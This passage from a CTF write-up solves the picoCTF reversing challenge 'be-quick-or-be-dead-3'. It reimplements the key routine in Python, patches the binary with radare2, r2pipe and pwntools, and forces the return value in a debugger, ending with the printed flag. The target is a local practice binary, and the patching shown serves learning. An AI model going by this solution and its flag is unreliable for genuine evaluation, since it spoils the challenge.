    <span style="color:#ff79c6">return</span> np<span style="color:#ff79c6">.</span>int32(eax <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x1234</span> <span style="color:#ff79c6">+</span> ebx)

val <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x186b5</span>

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(val):
    calc(i)

res <span style="color:#ff79c6">=</span> calc(np<span style="color:#ff79c6">.</span>int32(val))
<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#8be9fd;font-style:italic">hex</span>(res)
<span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#8be9fd;font-style:italic">str</span>(ctypes<span style="color:#ff79c6">.</span>c_uint(res))
</code></pre></td></tr></table>
</div>
</div><p>The result is:</p>
<ul>
<li>&lsquo;0x221d8eea&rsquo;</li>
<li>c_uint(572362474L)</li>
</ul>
<p>We have now to options:</p>
<ol>
<li>Option 1: We patch the binary with radare2 so that calculate_key function returns directly the key 0x221d8eea</li>
<li>Option 2: We patch with pwntools</li>
<li>Option 3: We enter radare2 in debug mode to change registers accordingly</li>
</ol>
<h3 id="option-1-patch-with-radare2">Option 1: Patch with radare2</h3>
<p>we open in RW mode with radare2 a copy of the binary called be-quick-or-be-dead-3-patched, then we patch it with the instructions <code>mov eax, &lt;RETURN_VALUE&gt;; ret</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">aa</span>
[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">s</span> <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">oo</span><span style="color:#ff79c6">+</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#f1fa8c">&#34;wa mov eax, 0x0x221d8eea ; ret &#34;</span>&#34;
<span style="color:#50fa7b">Written</span> <span style="color:#bd93f9">6</span> <span style="color:#8be9fd">byte</span>(<span style="color:#8be9fd;font-style:italic">s</span>) (<span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0x0</span><span style="color:#8be9fd;font-style:italic">x221d8eea</span> <span style="color:#6272a4">; ret ) = wx b8ea8e1d22c3</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pd</span> <span style="color:#bd93f9">2</span>
            <span style="color:#6272a4">; CALL XREF from sym.get_key @ 0x400828</span>
/ 16: <span style="color:#50fa7b">sym.calculate_key</span> ()<span style="color:#6272a4">;</span>
| <span style="color:#8be9fd;font-style:italic">bp:</span> 0 (<span style="color:#50fa7b">vars</span> <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">args</span> <span style="color:#bd93f9">0</span>)
| <span style="color:#8be9fd;font-style:italic">sp:</span> 0 (<span style="color:#50fa7b">vars</span> <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">args</span> <span style="color:#bd93f9">0</span>)
| <span style="color:#8be9fd;font-style:italic">rg:</span> 0 (<span style="color:#50fa7b">vars</span> <span style="color:#bd93f9">0</span>, <span style="color:#8be9fd;font-style:italic">args</span> <span style="color:#bd93f9">0</span>)
|           0<span style="color:#50fa7b">x00400792</span>      <span style="color:#8be9fd;font-style:italic">b8ea8e1d22</span>     <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0x221d8eea</span>
|           0<span style="color:#50fa7b">x00400797</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">q</span>
</code></pre></td></tr></table>
</div>
</div><p>We can pythonize the above with r2pipe:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> os
<span style="color:#ff79c6">import</span> r2pipe

LOCAL_PATH<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;.&#39;</span>
PRGM<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;be-quick-or-be-dead-3&#39;</span>
BINARY<span style="color:#ff79c6">=</span>os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, PRGM)
PATCHED_BINARY<span style="color:#ff79c6">=</span>os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, PRGM <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;-patched&#39;</span>)

KEY <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x221d8eea</span>
INSTRUCTIONS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mov eax, </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> ; ret &#39;</span> <span style="color:#ff79c6">%</span> KEY
ADDRESS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;sym.calculate_key&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">patch_instructions</span>(address, instructions):
    r2 <span style="color:#ff79c6">=</span> r2pipe<span style="color:#ff79c6">.</span>open(PATCHED_BINARY)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#39;aa&#39;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;s </span><span style="color:#f1fa8c">{</span>address<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;oo+&#34;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#39;&#34;wa </span><span style="color:#f1fa8c">{</span>instructions<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;&#39;</span>)
    r2<span style="color:#ff79c6">.</span>cmd(<span style="color:#f1fa8c">&#34;q&#34;</span>)
    <span style="color:#ff79c6">return</span>

<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(PATCHED_BINARY):
    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;cp </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> &amp;&amp; chmod u+x </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> (BINARY, PATCHED_BINARY, PATCHED_BINARY))
    patch_instructions(ADDRESS, INSTRUCTIONS)
os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> &amp;&amp; rm </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> (PATCHED_BINARY, PATCHED_BINARY))
</code></pre></td></tr></table>
</div>
</div><h3 id="option-2-patch-with-pwntools">Option 2: Patch with pwntools</h3>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
<span style="color:#ff79c6">import</span> os

LOCAL_PATH<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;.&#39;</span>
BINARY<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;be-quick-or-be-dead-3&#39;</span>
PATCHED_BINARY<span style="color:#ff79c6">=</span>os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, BINARY <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;-patched&#39;</span>)

key <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x221d8eea</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">patch</span>():
    elf <span style="color:#ff79c6">=</span> ELF(os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>join(LOCAL_PATH, BINARY))
    calculate_key <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;calculate_key&#39;</span>]

    elf<span style="color:#ff79c6">.</span>asm(elf<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;calculate_key&#39;</span>], <span style="color:#f1fa8c">&#39;mov eax, </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">ret</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> (<span style="color:#8be9fd;font-style:italic">hex</span>(key)))
    elf<span style="color:#ff79c6">.</span>save(PATCHED_BINARY)
    <span style="color:#ff79c6">return</span>

<span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>exists(PATCHED_BINARY):
    patch()
os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#39;chmod u+x </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> &amp;&amp; </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c"> &amp;&amp; rm </span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">&#39;</span> <span style="color:#ff79c6">%</span> (PATCHED_BINARY, PATCHED_BINARY, PATCHED_BINARY))
</code></pre></td></tr></table>
</div>
</div><h3 id="option-3-debug-mode-with-radare">Option 3: Debug mode with radare</h3>
<p>Instead of patching, we manually set the return value in eax, then we change eip registry to the <code>ret</code> instruction</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
            <span style="color:#6272a4">; CALL XREF from sym.get_key @ 0x400828</span>
            <span style="color:#6272a4">;-- rip:</span>
/ 16: <span style="color:#50fa7b">sym.calculate_key</span> ()<span style="color:#6272a4">;</span>
|           0<span style="color:#50fa7b">x00400792</span> <span style="color:#8be9fd;font-style:italic">b</span>    <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x00400793</span>      <span style="color:#bd93f9">4889</span><span style="color:#8be9fd;font-style:italic">e5</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">rbp</span>, <span style="color:#8be9fd;font-style:italic">rsp</span>
|           0<span style="color:#50fa7b">x00400796</span>      <span style="color:#8be9fd;font-style:italic">bfb5860100</span>     <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">edi</span>, <span style="color:#bd93f9">0x186b5</span>
|           0<span style="color:#50fa7b">x0040079b</span>      <span style="color:#8be9fd;font-style:italic">e866ffffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.calc</span>
|           0<span style="color:#50fa7b">x004007a0</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
\           0<span style="color:#50fa7b">x004007a1</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">ood</span>
<span style="color:#50fa7b">Process</span> <span style="color:#8be9fd;font-style:italic">with</span> <span style="color:#8be9fd;font-style:italic">PID</span> <span style="color:#bd93f9">4493</span> <span style="color:#8be9fd;font-style:italic">started...</span>
= <span style="color:#50fa7b">attach</span> <span style="color:#bd93f9">4493</span> <span style="color:#bd93f9">4493</span>
<span style="color:#50fa7b">File</span> <span style="color:#8be9fd;font-style:italic">dbg</span>:<span style="color:#ff79c6">///</span><span style="color:#8be9fd;font-style:italic">home</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">ctf</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">kali</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">picoCTF</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">reversing</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">be</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">quick</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">or</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">be</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">dead</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span><span style="color:#ff79c6">/</span><span style="color:#8be9fd;font-style:italic">be</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">quick</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">or</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">be</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">dead</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span>  <span style="color:#8be9fd;font-style:italic">reopened</span> <span style="color:#8be9fd;font-style:italic">in</span> <span style="color:#8be9fd;font-style:italic">read</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">write</span> <span style="color:#8be9fd;font-style:italic">mode</span>
4493
[0<span style="color:#50fa7b">x7fc4ce9ab100</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">db</span> <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
[0<span style="color:#50fa7b">x7fc4ce9ab100</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">dc</span>
<span style="color:#50fa7b">Be</span> <span style="color:#8be9fd;font-style:italic">Quick</span> <span style="color:#8be9fd;font-style:italic">Or</span> <span style="color:#8be9fd;font-style:italic">Be</span> <span style="color:#8be9fd;font-style:italic">Dead</span> <span style="color:#bd93f9">3</span>
=====================

<span style="color:#50fa7b">Calculating</span> <span style="color:#8be9fd;font-style:italic">key...</span>
<span style="color:#50fa7b">hit</span> <span style="color:#8be9fd;font-style:italic">breakpoint</span> <span style="color:#8be9fd;font-style:italic">at</span>: <span style="color:#bd93f9">400792</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">dr</span> <span style="color:#8be9fd;font-style:italic">eax</span>=<span style="color:#bd93f9">0x221d8eea</span>
0<span style="color:#50fa7b">x00000000</span> <span style="color:#ff79c6">-&gt;</span><span style="color:#bd93f9">0x221d8eea</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">dr</span> <span style="color:#8be9fd;font-style:italic">rip</span>=<span style="color:#bd93f9">0x004007a1</span>
0<span style="color:#50fa7b">x00400792</span> <span style="color:#ff79c6">-&gt;</span><span style="color:#bd93f9">0x004007a1</span>
[0<span style="color:#50fa7b">x00400792</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">dc</span>
<span style="color:#50fa7b">child</span> <span style="color:#8be9fd;font-style:italic">stopped</span> <span style="color:#8be9fd;font-style:italic">with</span> <span style="color:#8be9fd;font-style:italic">si</span><span style="color:#8be9fd;font-style:italic">gnal</span> <span style="color:#bd93f9">14</span>
[+] <span style="color:#50fa7b">SIGNAL</span> <span style="color:#bd93f9">14</span> <span style="color:#8be9fd;font-style:italic">errno</span>=<span style="color:#bd93f9">0</span> <span style="color:#8be9fd;font-style:italic">addr</span>=<span style="color:#bd93f9">0x00000000</span> <span style="color:#8be9fd;font-style:italic">code</span>=<span style="color:#bd93f9">128</span> <span style="color:#8be9fd;font-style:italic">ret</span>=<span style="color:#bd93f9">0</span>
<span style="color:#50fa7b">Done</span> <span style="color:#8be9fd;font-style:italic">calculating</span> <span style="color:#8be9fd;font-style:italic">key</span>
<span style="color:#50fa7b">Printing</span> <span style="color:#8be9fd;font-style:italic">flag</span>:
<span style="color:#50fa7b">picoCTF</span>{<span style="color:#8be9fd;font-style:italic">dynamic_pr0gramming_ftw_a0b0b7f8</span>}
[+] <span style="color:#50fa7b">signal</span> <span style="color:#bd93f9">14</span> <span style="color:#8be9fd;font-style:italic">aka</span> <span style="color:#8be9fd;font-style:italic">SI</span><span style="color:#8be9fd;font-style:italic">GALRM</span> <span style="color:#8be9fd;font-style:italic">received</span> <span style="color:#bd93f9">0</span>
[0<span style="color:#50fa7b">x7fc4ce894136</span>]<span style="color:#ff79c6">&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>We can pythonize the above with r2pipe</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
